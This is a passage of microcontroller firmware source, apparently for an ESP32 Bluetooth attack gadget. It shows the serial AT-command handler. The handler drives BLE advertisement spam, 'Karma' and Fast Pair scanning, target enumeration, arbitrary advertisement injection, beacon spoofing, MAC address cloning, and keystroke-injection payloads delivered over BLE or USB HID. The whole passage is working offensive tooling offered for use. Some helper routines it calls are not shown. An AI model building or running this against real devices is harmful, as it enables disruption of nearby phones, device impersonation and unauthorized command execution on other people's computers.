                   "BLEENUM=MAC,HID=payload,HIDUSB=payload,HIDSTOP,HIDSTATUS");
  }

  // ── BLE Spam ───────────────────────────────────────────────────
  else if (u.startsWith("AT+SPAM=")) {
    String p=c.substring(8); int cm=p.indexOf(',');
    sType=p.substring(0,cm>0?cm:p.length()); sType.toLowerCase();
    int dur=cm>0?constrain(p.substring(cm+1).toInt(),1,600):30;
    pkts=0; pktReport=0; spamIdx=0;
    spamEnd=millis()+(unsigned long)dur*1000UL;
    spamActive=true; beaconActive=false;
    Serial.println("OK:SPAM:"+sType+":"+String(dur));
  }
  else if (u == "AT+STOP") {
    spamActive=karmaActive=beaconActive=beaconLoop=false; hidRunning=false;
    pAdv->stop(); NimBLEDevice::getScan()->stop();
    Serial.println("OK:STOP:pkts="+String(pkts)+",karma="+String(karmaCount));
  }

  // ── Karma ──────────────────────────────────────────────────────
  else if (u.startsWith("AT+KARMA=")) {
    int dur=constrain(c.substring(9).toInt(),5,600);
    karmaActive=true; karmaCount=0; karmaEndMs=millis()+(unsigned long)dur*1000UL;
    auto* sc=NimBLEDevice::getScan();
    sc->setScanCallbacks(new KarmaScanCB(),false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    sc->start(dur,false);
    Serial.println("OK:KARMA:"+String(dur));
  }
  else if (u=="AT+KARMASTOP") {
    karmaActive=false; NimBLEDevice::getScan()->stop();
    Serial.println("OK:KARMASTOP:"+String(karmaCount));
  }

  // ── Scans ──────────────────────────────────────────────────────
  else if (u.startsWith("AT+SCAN=")) {
    int s=constrain(c.substring(8).toInt(),1,60);
    auto* sc=NimBLEDevice::getScan(); sc->setScanCallbacks(new ScanCB(),false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:SCAN:"+String(s)); sc->start(s,false); Serial.println("OK:SCANDONE");
  }
  else if (u.startsWith("AT+FPSCAN=")) {
    int s=constrain(c.substring(10).toInt(),1,60);
    auto* sc=NimBLEDevice::getScan(); sc->setScanCallbacks(new FastPairScanCB(),false);
    sc->setActiveScan(true); sc->setInterval(80); sc->setWindow(79);
    Serial.println("OK:FPSCAN:"+String(s)); sc->start(s,false); Serial.println("OK:FPSCANDONE");
  }
  else if (u.startsWith("AT+SCANRAW=")) {
    int s=constrain(c.substring(11).toInt(),1,60);
    auto* sc=NimBLEDevice::getScan(); sc->setScanCallbacks(new RawScanCB(),false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:SCANRAW:"+String(s)); sc->start(s,false); Serial.println("OK:SCANRAWDONE");
  }
  else if (u.startsWith("AT+BLEENUM=")) {
    String target=c.substring(11); target.trim();
    auto* sc=NimBLEDevice::getScan();
    BleEnumScanCB* cb=new BleEnumScanCB(); cb->target=target;
    sc->setScanCallbacks(cb,false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:BLEENUM:"+target); sc->start(8,false); Serial.println("OK:BLEEENUMDONE");
  }

  // ── Custom ADV ─────────────────────────────────────────────────
  else if (u.startsWith("AT+ADV=")) {
    String h=c.substring(7); uint8_t b[31]; int n=0;
    for(unsigned int i=0;i+1<h.length()&&n<31;i+=2)
      b[n++]=(uint8_t)strtol(h.substring(i,i+2).c_str(),NULL,16);
    txPayload(b,n); Serial.println("OK:ADV:"+String(n));
  }

  // ── Beacon ─────────────────────────────────────────────────────
  else if (u.startsWith("AT+BEACON=")) {
    String p=c.substring(10); int cm=p.indexOf(',');
    beaconName=p.substring(0,cm>0?cm:p.length());
    int dur=cm>0?p.substring(cm+1).toInt():0;
    uint8_t buf[33]; uint8_t nlen=min((int)beaconName.length(),29);
    buf[0]=nlen+1; buf[1]=0x09; memcpy(&buf[2],beaconName.c_str(),nlen);
    NimBLEAdvertisementData ad; ad.addData(buf,nlen+2);
    pAdv->stop(); pAdv->setAdvertisementData(ad);
    pAdv->setScanResponseData(NimBLEAdvertisementData());
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON); pAdv->start();
    beaconActive=true; beaconLoop=false;
    beaconEnd=dur>0?millis()+(unsigned long)dur*1000UL:0;
    Serial.println("OK:BEACON:"+beaconName+":"+String(dur));
  }
  else if (u=="AT+BEACONSTOP") {
    beaconActive=beaconLoop=false; pAdv->stop(); Serial.println("OK:BEACONSTOP");
  }
  else if (u.startsWith("AT+BEACONLOOP=")) {
    String p=c.substring(14); int cm=p.indexOf(',');
    beaconName=p.substring(0,cm>0?cm:p.length());
    beaconInterval=cm>0?constrain(p.substring(cm+1).toInt(),50,5000):200;
    uint8_t buf[33]; uint8_t nlen=min((int)beaconName.length(),29);
    buf[0]=nlen+1; buf[1]=0x09; memcpy(&buf[2],beaconName.c_str(),nlen);
    NimBLEAdvertisementData ad; ad.addData(buf,nlen+2);
    pAdv->stop(); pAdv->setAdvertisementData(ad);
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    beaconActive=true; beaconLoop=true; beaconEnd=0;
    Serial.println("OK:BEACONLOOP:"+beaconName+":"+String(beaconInterval));
  }

  // ── MAC Clone ──────────────────────────────────────────────────
  else if (u.startsWith("AT+MACCLONE=")) {
    String mac=c.substring(12); mac.trim();
    if (mac=="RANDOM"||mac=="OFF") {
      useMacClone=false; Serial.println("OK:MACCLONE:RANDOM");
    } else if (mac.length()>=17) {
      for(int i=0;i<6;i++) cloneMac[i]=(uint8_t)strtol(mac.substring(i*3,i*3+2).c_str(),NULL,16);
      cloneMac[5]=(cloneMac[5]|0xC0)&0xFE; useMacClone=true;
      Serial.println("OK:MACCLONE:"+mac);
    } else { Serial.println("ERR:MACCLONE:invalid"); }
  }

  // ── TX Power / RSSI ───────────────────────────────────────────
  else if (u.startsWith("AT+SETPOWER=")) {
    txPowerLevel=constrain(c.substring(12).toInt(),0,9);
    applyTxPower(); Serial.println("OK:SETPOWER:"+String(txPowerLevel));
  }
  else if (u.startsWith("AT+RSSI=")) {
    rssiFilter=(int8_t)constrain(c.substring(8).toInt(),-127,0);
    Serial.println("OK:RSSI:"+String(rssiFilter));
  }

  // ── HID Injection — S3 exclusive ─────────────────────────────
  else if (u.startsWith("AT+HID=")) {
    // BLE HID (uses NimBLE HID server — sends to paired device)
    if (hidRunning) { Serial.println("ERR:HID:BUSY"); return; }
    hidPayload = c.substring(7);
    HIDParams* params = new HIDParams{hidPayload, false};
    xTaskCreate(hidTaskFunc, "hid", 8192, params, 1, &hidTaskHandle);
    Serial.println("OK:HID:BLE:" + String(hidPayload.length()));
  }
  else if (u.startsWith("AT+HIDUSB=")) {
#if HID_AVAILABLE
    if (hidRunning) { Serial.println("ERR:HIDUSB:BUSY"); return; }
    hidPayload = c.substring(10);
    HIDParams* params = new HIDParams{hidPayload, true};
    xTaskCreate(hidTaskFunc, "hidusb", 8192, params, 1, &hidTaskHandle);
    Serial.println("OK:HIDUSB:" + String(hidPayload.length()));
#else
    Serial.println("ERR:HIDUSB:NOT_COMPILED — recompile with USB OTG enabled");
#endif
  }
  else if (u == "AT+HIDSTOP") {
    hidRunning = false;
    if (hidTaskHandle) { vTaskDelete(hidTaskHandle); hidTaskHandle = NULL; }
#if HID_AVAILABLE
    hidKeyboard.releaseAll();
#endif
    Serial.println("OK:HIDSTOP");
  }
  else if (u == "AT+HIDSTATUS") {
    Serial.println("OK:HIDSTATUS:" + String(hidRunning ? "running" : "idle") +
                   ",hid_available=" + String(HID_AVAILABLE ? "USB+BLE" : "BLE_ONLY"));
  }

  else {
    Serial.println("ERR:" + c);
  }
}
